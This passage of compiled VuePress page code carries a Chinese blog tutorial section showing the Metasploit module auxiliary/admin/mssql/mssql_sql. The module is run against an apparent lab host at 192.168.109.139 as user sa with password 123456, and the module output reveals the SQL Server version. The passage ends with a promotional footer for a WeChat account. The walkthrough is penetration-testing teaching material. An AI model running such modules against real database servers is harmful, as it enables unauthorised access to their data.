"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br")])]),a("h2",{attrs:{id:"运行sql查询命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#运行sql查询命令"}},[s._v("#")]),s._v(" 运行SQL查询命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/admin/mssql/mssql_sql\nshow options\nset RHOST 192.168.109.139\nset PASSWORD 123456\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('msf > use auxiliary/admin/mssql/mssql_sql\nmsf auxiliary(admin/mssql/mssql_sql) > show options\n\nModule options (auxiliary/admin/mssql/mssql_sql):\n\n   Name                 Current Setting   Required  Description\n   ----                 ---------------   --------  -----------\n   PASSWORD                               no        The password for the specified username\n   RHOST                                  yes       The target address\n   RPORT                1433              yes       The target port (TCP)\n   SQL                  select @@version  no        The SQL query to execute\n   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"\n   USERNAME             sa                no        The username to authenticate as\n   USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)\n\nmsf auxiliary(admin/mssql/mssql_sql) > set RHOST 192.168.109.139\nRHOST => 192.168.109.139\nmsf auxiliary(admin/mssql/mssql_sql) > set PASSWORD 123456\nPASSWORD => 123456\nmsf auxiliary(admin/mssql/mssql_sql) > run\n\n[*] 192.168.109.139:1433 - SQL Query: select @@version\n[*] 192.168.109.139:1433 - Row Count: 1 (Status: 16 Command: 193)\n\n\n\n NULL\n ----\n Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) \n    Jun 28 2012 08:36:30 \n    Copyright (c) Microsoft Corporation\n    Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)\n\n\n[*] Auxiliary module execution completed\nmsf auxiliary(admin/mssql/mssql_sql) > \n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br")])]),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=r.exports}}]);